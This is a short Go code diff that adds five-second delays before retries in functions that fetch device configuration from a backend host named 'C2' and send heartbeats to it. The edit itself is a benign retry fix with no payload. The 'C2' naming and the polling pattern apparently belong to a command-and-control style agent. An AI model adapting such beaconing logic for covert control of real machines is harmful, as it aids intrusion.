@@ -30,6 +30,7 @@ func GetConfFromBackend() {
 		req, err := http.NewRequest("GET", "http://"+config.Config.C2+":8000/api/devices/getDeviceConf", responseBody)
 		if err != nil {
 			log.Logger.Info().Msgf("[X]\tError on response.\n[ERROR] -  \n", err)
+			time.Sleep(time.Second * 5)
 			goto getConf
 		}
 		// add authorization header to the req
@@ -40,6 +41,7 @@ func GetConfFromBackend() {
 		resp, err := client.Do(req)
 		if err != nil {
 			log.Logger.Error().Msgf("[X]\tError on response.\n[ERROR] -  \n", err)
+			time.Sleep(time.Second * 5)
 			goto getConf
 		}
 
@@ -49,6 +51,7 @@ func GetConfFromBackend() {
 
 		if err := decoder.Decode(&respStruct); err != nil {
 			log.Logger.Error().Msgf("[X]\tError in decode.\n[ERROR] -  \n", err)
+			time.Sleep(time.Second * 5)
 			goto getConf
 		}
 		resp.Body.Close()
@@ -113,6 +116,7 @@ func Heartbeat() {
 		resp, err := client.Do(req)
 		if err != nil {
 			log.Logger.Error().Msgf("[X]\tError on response.\n[ERROR] -  \n", err)
+			time.Sleep(time.Second * 5)
 			goto loop
 		}
 
